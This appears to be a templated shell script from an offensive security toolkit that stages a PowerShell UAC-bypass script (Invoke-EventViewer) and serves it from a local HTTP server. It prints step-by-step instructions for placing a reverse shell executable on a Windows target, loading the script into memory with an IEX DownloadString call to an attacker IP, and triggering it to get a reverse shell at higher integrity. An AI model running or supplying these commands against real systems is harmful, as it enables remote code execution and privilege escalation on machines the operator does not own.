mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/uacbypass/Invoke-EventViewer.ps1 packstation/outbound/; \
echo '================================================================'; \
echo '                      -----PowerShell-----                      '; \
echo 'Preparation 1: Transfer a revshell.exe to the target (<%=$(esh variables/delivery_path_windows)%>\revshell.exe) and start the listener'; \
echo 'Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/Invoke-EventViewer.ps1\')'; \
echo 'Execute (It takes a few seconds to trigger the revshell): Invoke-EventViewer <%=$(esh variables/delivery_path_windows)%>\revshell.exe'; \
echo 'NOTE: You should get a new revshell with a higher integrity level (but still the same user)'; \
echo '================================================================'; \
python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
